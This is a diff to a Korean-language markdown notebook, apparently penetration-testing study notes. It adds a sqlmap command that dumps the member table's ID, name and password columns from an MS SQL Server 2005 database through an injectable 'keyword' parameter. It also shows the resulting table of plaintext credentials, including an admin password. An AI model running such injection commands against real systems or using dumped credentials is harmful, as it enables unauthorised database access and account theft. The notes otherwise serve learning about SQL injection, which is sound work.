@@ -188,4 +188,18 @@ python sqlmap.py -r 1.txt --dbs --dbms="Microsoft SQL Server 2005" -p keyword(�
 
 ![](../Images/Pasted%20image%2020260730104121.png)
 
-- 
+- 공격 대상 bID, bName, bPass
+	- python sqlmap.py -r 1.txt --dump -D board -T member -C bID,bName,bPass --dbms="Microsoft SQL Server 2005" -p keyword
+
+```sql
++-------+---------+--------+
+| bID   | bName   | bPass  |
++-------+---------+--------+
+| aaaa  | ?\xb1浿 | aaaa   |
+| admin | 관리자  | sec123 |
+| bbbb  | 이순신  | bbbb   |
+| test  | test    | test   |
+| test  | test    | test   |
++-------+---------+--------+
+```
+
